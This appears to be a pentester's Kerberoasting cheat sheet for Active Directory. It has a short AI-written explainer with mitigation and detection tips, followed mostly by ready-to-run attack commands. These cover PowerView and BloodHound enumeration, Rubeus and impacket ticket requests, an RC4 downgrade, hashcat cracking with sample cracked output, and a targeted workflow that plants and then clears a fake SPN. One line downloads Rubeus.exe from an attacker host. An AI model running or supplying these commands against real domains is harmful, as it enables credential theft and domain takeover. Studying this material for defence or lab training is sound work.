
## Targeted Kerberoasting Attack Primer:

- To perform this attack we need 1 of these rights over the user:
    - `WriteOwner`
    - `GenericAll`
    - `GenericWrite`
    - `WriteProperty`
    - `Validated-SPN`
    - `WriteProperties`

## notebooklm AI

A **Kerberoast attack** is a lateral movement and privilege escalation technique specifically targeting **Service Principal Name (SPN) accounts** within Active Directory (AD) environments. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Often, domain accounts are employed to run services, making them potential targets.

**How it Works** The core mechanism involves an attacker, as any domain user, requesting a Kerberos ticket for a service account. This is also possible across **forest trusts** if authentication is permitted. The primary objective is to obtain a **Ticket Granting Service (TGS) ticket** for a service account, which can then be cracked offline to reveal the account's **cleartext password**. If the cracked password belongs to a user with administrative privileges, this can lead to significantly expanded access or even full domain compromise.

**Key Characteristics and Concepts**

- **Target:** The attack specifically targets service accounts configured with SPNs.
- **Outcome:** It serves as a method for lateral movement and privilege escalation within a domain.
- **Offline Cracking:** The TGS tickets are typically obtained as **RC4-encrypted hashes** (type 23) or, less commonly, AES-encrypted hashes (type 18), which are then subjected to offline cracking using tools like Hashcat or John the Ripper. RC4 hashes are generally weaker and quicker to crack than AES hashes.
- **Prerequisites:** An attacker needs valid domain user credentials (cleartext password or NTLM hash, especially for Impacket tools) or a shell in the context of a domain user. The IP address of a Domain Controller is also necessary to query for SPNs.
- **Targeted Kerberoasting:** If an attacker has `GenericWrite` or `GenericAll` Access Control Entry (ACE) rights over a user object, they can manipulate the `servicePrincipalName` attribute to create a fake SPN, request a TGS ticket for it, and then potentially revert the modification, allowing them to crack the password.

**Tools and Methods** Kerberoasting can be executed from both Linux and Windows attack hosts:

- **Linux Tools:**
    
    - **Impacket's `GetUserSPNs.py`**: This tool is widely used from non-domain joined Linux hosts. It requires domain user credentials and a Domain Controller's IP to gather SPN listings and request TGS tickets in a format suitable for offline cracking.
    - **`ticketer.py`**: Part of the Impacket toolkit, it is used for creating and customizing Kerberos Ticket Granting Tickets (TGT) and TGS tickets.
- **Windows Tools:**
    
    - **Rubeus (from GhostPack)**: A highly automated and efficient tool for Kerberoasting. It offers various options, including filtering for accounts with `admincount=1` (indicating privileged accounts), specifying different encryption types, and exporting hashes directly. The `/tgtdeleg` flag can be particularly useful on older Domain Controllers (Windows Server 2016 and earlier) to force the request of RC4-encrypted tickets, which are faster to crack, even if the account supports stronger AES encryption.
    - **PowerView**: This PowerShell tool can enumerate SPN accounts, extract TGS tickets, and convert them into Hashcat-compatible formats.
    - **`setspn.exe` (Built-in Binary)**: Used in more manual attack chains, often in conjunction with PowerShell and Mimikatz, to enumerate SPNs in a domain.
    - **Mimikatz**: Can extract Kerberos tickets from memory, either as `.kirbi` files or base64-encoded blobs, for subsequent offline cracking.

**Efficacy and Risk** The effectiveness of a Kerberoast attack is directly linked to the **strength of the service account's password**. Weak or common passwords can be cracked rapidly, potentially leading to significant access. Conversely, strong, complex passwords make offline cracking difficult or impossible within reasonable timeframes. Attackers like Tim Medin have discussed this attack in detail, emphasizing these aspects. Kerberoasting is classified under the MITRE ATT&CK framework as **TA0006 Credential Access**, specifically technique **T1558 Steal or Forge Kerberos Tickets**, and sub-technique **T1558.003 Kerberoasting**.

**Mitigation and Detection** Organizations can implement various measures to mitigate and detect Kerberoasting attacks:

- **Mitigation Strategies:**
    
    - **Strong Password Policies:** Enforce the use of long and complex passwords or passphrases for service accounts that are not easily found in wordlists.
    - **Stronger Encryption:** Prioritize and enforce the use of stronger encryption schemes (like AES) for Kerberos authentication over RC4, and restrict the use of the RC4 algorithm for service accounts where possible.
    - **Managed Service Accounts (MSA) and Group Managed Service Accounts (gMSA):** These accounts utilize highly complex, automatically rotating passwords, which significantly reduces the risk of successful Kerberoasting.
    - **Limit Privileged SPN Accounts:** Avoid using highly privileged accounts, such as Domain Admins, as SPN accounts.
    - **Regular Audits:** Periodically audit user account permissions for excessive group memberships that might create attack paths.
- **Detection Strategies:**
    
    - **Monitor TGS Requests:** Look for an unusually high number of Kerberos TGS-REQ and TGS-REP requests, which can indicate automated Kerberoasting tools at work.
    - **Event Logging:** Configure Domain Controllers to log Kerberos TGS ticket operations by enabling "Audit Kerberos Service Ticket Operations" in Group Policy. Monitor for Event IDs **4769 (a Kerberos service ticket was requested)** and **4770 (a Kerberos service ticket was renewed)**. A large volume of Event ID 4769 from a single account within a short period is a strong indicator of an attack.
    - **Identify Encryption Type:** When monitoring logs, note the encryption type used in ticket requests (e.g., `0x17` for RC4), as this indicates a weaker encryption that could be more easily cracked.

---

## Enumeration — Find Kerberoastable Accounts

**PowerView (Windows)**
```powershell
# List all accounts with SPNs
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# Filter for high-value targets (admincount=1)
Get-DomainUser -SPN -AdminCount | select samaccountname, serviceprincipalname
```

**BloodHound** — run the built-in query: *"List all Kerberoastable Accounts"* — then filter for those with a path to DA.

---

## Rubeus
Machine location
```shell
┌──(kali㉿kali)-[~/tools/Ghostpack-CompiledBinaries]
└─$ pwd                      
/home/kali/tools/Ghostpack-CompiledBinaries
                                                                                                                    
┌──(kali㉿kali)-[~/tools/Ghostpack-CompiledBinaries]
└─$ ls -lh
total 2.9M
-rw-rw-r-- 1 kali kali 170K Sep 23 17:45  Certify.exe
drwxrwxr-x 2 kali kali 4.0K Sep 23 17:45 'dotnet v3.5 compiled binaries'
drwxrwxr-x 2 kali kali 4.0K Sep 23 17:45 'dotnet v4.5 compiled binaries'
drwxrwxr-x 2 kali kali 4.0K Sep 23 17:45 'dotnet v4.7.2 compiled binaries'
-rw-rw-r-- 1 kali kali  33K Sep 23 17:45  Koh.exe
-rw-rw-r-- 1 kali kali  15K Sep 23 17:45  LockLess.exe
-rw-rw-r-- 1 kali kali  246 Sep 23 17:45  README.md
-rw-rw-r-- 1 kali kali 8.0K Sep 23 17:45  RestrictedAdmin.exe
-rw-rw-r-- 1 kali kali 437K Sep 23 17:45  Rubeus.exe
-rw-rw-r-- 1 kali kali 714K Sep 23 17:45  SafetyKatz.exe
-rw-rw-r-- 1 kali kali 583K Sep 23 17:45  Seatbelt.exe
-rw-rw-r-- 1 kali kali 723K Sep 23 17:45  SharpChrome.exe
-rw-rw-r-- 1 kali kali 127K Sep 23 17:45  SharpDPAPI.exe
-rw-rw-r-- 1 kali kali 8.5K Sep 23 17:45  SharpDump.exe
-rw-rw-r-- 1 kali kali  15K Sep 23 17:45  SharpRoast.exe
-rw-rw-r-- 1 kali kali  39K Sep 23 17:45  SharpUp.exe
-rw-rw-r-- 1 kali kali  53K Sep 23 17:45  SharpWMI.exe
```

Run it — standard kerberoast
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Target only high-value accounts (`admincount=1`)
```powershell
.\Rubeus.exe kerberoast /admincount /outfile:hashes.kerberoast
```

Force RC4 downgrade (useful when account supports AES — works best on DC <= Server 2016)
```powershell
.\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.kerberoast
```

Target a specific user
```powershell
.\Rubeus.exe kerberoast /user:iis_service /outfile:hashes.kerberoast
```

```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast
```


```powershell
iwr -uri http://192.168.45.175/Rubeus.exe -Outfile Rubeus.exe
```

---

## Impacket — Linux

Using impacket-GetUserSPNs to perform Kerberoasting on Linux
```shell
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

With password written to file (avoids interactive prompt)
```shell
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete -outputfile hashes.kerberoast
```

Using NTLM hash instead of cleartext password (useful post-pass-the-hash)
```shell
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete -hashes :NTLMhashhere -outputfile hashes.kerberoast
```

Example output
```shell
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  -----------  --------  --------------------------  ---------  ----------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
```

---

## netexec (nxc)

Quick one-liner from Linux — no Rubeus or impacket setup needed
```shell
nxc ldap <dc-ip> -u user -p 'password' --kerberoasting hashes.kerberoast
```

With NTLM hash
```shell
nxc ldap <dc-ip> -u user -H :NTLMhashhere --kerberoasting hashes.kerberoast
```

---

## Cracking

**Hash type reference**

| Hash prefix    | etype             | Hashcat mode | Notes                                  |
| -------------- | ----------------- | ------------ | -------------------------------------- |
| `$krb5tgs$23$` | RC4 (type 23)     | `13100`      | Fast to crack, default for older DCs   |
| `$krb5tgs$18$` | AES-256 (type 18) | `19700`      | Slow — force RC4 downgrade if possible |
| `$krb5tgs$17$` | AES-128 (type 17) | `19600`      | Slow — force RC4 downgrade if possible |

If you get AES hashes, try RC4 downgrade via Rubeus `/tgtdeleg` or impacket `-k` before spending time cracking.

Reviewing the correct Hashcat mode
```shell
kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```

Cracking RC4 TGS-REP hash
```shell
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Cracking AES-256 TGS-REP hash
```shell
sudo hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Example cracked output
```shell
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$...
...a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e:Strawberry1
```

---

## Targeted Kerberoasting Workflow

Use when you have `GenericWrite` / `GenericAll` / `WriteProperty` over a user that does **not** already have an SPN.

**Step 1 — Verify the user has no SPN**
```powershell
Get-DomainUser targetuser | select samaccountname, serviceprincipalname
```

**Step 2 — Set a fake SPN**
```powershell
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/BLAH'}
```

**Step 3 — Request the TGS ticket**
```powershell
# With Rubeus
.\Rubeus.exe kerberoast /user:targetuser /outfile:targeted.kerberoast

# Or with impacket from Linux
sudo impacket-GetUserSPNs -request -dc-ip <dc-ip> corp.com/attacker -outputfile targeted.kerberoast
```

**Step 4 — Remove the fake SPN (clean up)**
```powershell
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

**Step 5 — Crack the hash**
```
sudo hashcat -m 13100 targeted.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
